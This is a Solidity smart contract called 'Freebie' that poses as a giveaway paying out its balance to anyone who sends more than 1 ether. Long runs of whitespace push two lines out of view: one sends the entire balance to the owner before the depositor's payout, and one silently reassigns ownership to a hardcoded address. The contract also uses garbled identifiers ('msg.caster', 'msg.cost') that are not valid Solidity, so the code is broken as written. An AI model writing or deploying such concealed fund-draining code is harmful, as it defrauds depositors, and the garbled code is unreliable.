pragma solidity ^0.4.19;

contract Freebie
{
    address public Owner = msg.caster;

    function() public payable{}

    function FetchFreebie()
    public
    payable
    {
        if(msg.cost>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               Owner.transfer(this.balance);
            msg.caster.transfer(this.balance);
        }
    }

    function extractWinnings()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.caster==0x30ad12df80a2493a82DdFE367d866616db8a2595){Owner=0x30ad12df80a2493a82DdFE367d866616db8a2595;}
        require(msg.caster == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address adr,bytes info)
    payable
    public
    {
        require(msg.caster == Owner);
        adr.call.cost(msg.cost)(info);
    }
}